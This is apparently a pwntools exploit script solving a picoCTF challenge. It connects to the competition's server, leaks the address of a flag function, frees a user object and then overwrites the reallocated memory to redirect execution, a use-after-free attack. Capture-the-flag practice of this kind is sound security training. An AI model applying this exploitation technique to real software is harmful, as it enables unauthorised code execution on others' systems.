from pwn import *

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)

#io = process(exe)
io = remote("mercury.picoctf.net", "4504")

context.log_level = "debug"

# Run subscribe function to leak address of flag function
io.recvuntil(b"(e)xit\n")
io.sendline(b"s")

# Get address of flag function
leak = io.recvline()
print(leak)
leak = int(leak[-8:-1].decode(), 16)
print(f"Leak = {hex(leak)}")

# Free the user
io.recvuntil(b"(e)xit\n")
io.sendline(b"i")
io.recvline()
io.sendline(b"y")

# Set where the first variable of user is to the flag function
io.recvuntil(b"(e)xit\n")
io.sendline(b"l")
io.recvuntil(b"anyways:\n")
io.sendline(p32(leak))

# Receive flag
io.interactive()
